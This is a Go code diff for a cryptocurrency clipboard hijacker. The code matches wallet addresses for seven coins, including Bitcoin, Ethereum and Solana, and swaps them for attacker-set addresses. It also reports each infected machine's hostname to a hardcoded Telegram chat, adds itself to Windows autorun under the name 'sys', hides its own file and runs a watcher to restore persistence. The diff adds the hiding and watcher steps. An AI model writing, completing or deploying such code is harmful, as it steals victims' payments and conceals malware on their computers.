@@ -4,6 +4,11 @@ import (
 	"fmt"
 	"os"
 	"regexp"
+
+	"clipper/src/autorun"
+	"clipper/src/clipper"
+	"clipper/src/hide"
+	"clipper/src/telegram"
 )
 
 var (
@@ -16,20 +21,15 @@ var (
 	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
 )
 
-type coinMatcher struct {
-	regex *regexp.Regexp
-	addr  string
-}
-
 /* *** change this *** */
-var matchers = []coinMatcher{
-	{btcRegex, "btc_clipped"},         // BTC
-	{ethRegex, "eth_clipped"},         // ETH
-	{ltcRegex, "ltc_clipped"},         // LTC
-	{dogeRegex, "doge_clipped"},       // DOGE
-	{tonRegex, "ton_clipped"},         // TON
-	{usdttrcRegex, "usdttrc_clipped"}, // USDT TRC20
-	{solRegex, "sol_clipped"},         // Solana
+var matchers = []clipper.Matcher{
+	{Regex: btcRegex, Addr: "btc_clipped"},         // BTC
+	{Regex: ethRegex, Addr: "eth_clipped"},         // ETH
+	{Regex: ltcRegex, Addr: "ltc_clipped"},         // LTC
+	{Regex: dogeRegex, Addr: "doge_clipped"},       // DOGE
+	{Regex: tonRegex, Addr: "ton_clipped"},         // TON
+	{Regex: usdttrcRegex, Addr: "usdttrc_clipped"}, // USDT TRC20
+	{Regex: solRegex, Addr: "sol_clipped"},         // Solana
 }
 
 /* *** change this *** */
@@ -38,22 +38,26 @@ var (
 	chat_id   = "7336461438" // u can use group (starts with -100) or chat id
 )
 
-
 func main() {
 	hostname, _ := os.Hostname()
 
 	// send start log to telegram
-	SendLog(fmt.Sprintf(
+	telegram.SendLog(fmt.Sprintf(
 		"Connected - %s",
 		hostname,
 	), chat_id, bot_token)
 
 	// we adding self to windows autorun
-	selfDir, _ := GetSelfDir()
-	_ = AddToAutorun(selfDir, "sys")
+	selfDir, _ := autorun.GetSelfDir()
+	autoRunName := "sys" // name autorun in registry
+	_ = autorun.AddToAutorun(selfDir, autoRunName)
+
+	_ = hide.HideFile(selfDir)
 
 	// we starting main clipper process
-	StartClipper()
+	clipper.StartClipper(chat_id, bot_token, matchers)
+
+	autorun.StartWatcher(selfDir, autoRunName)
 
 	select {}
 }
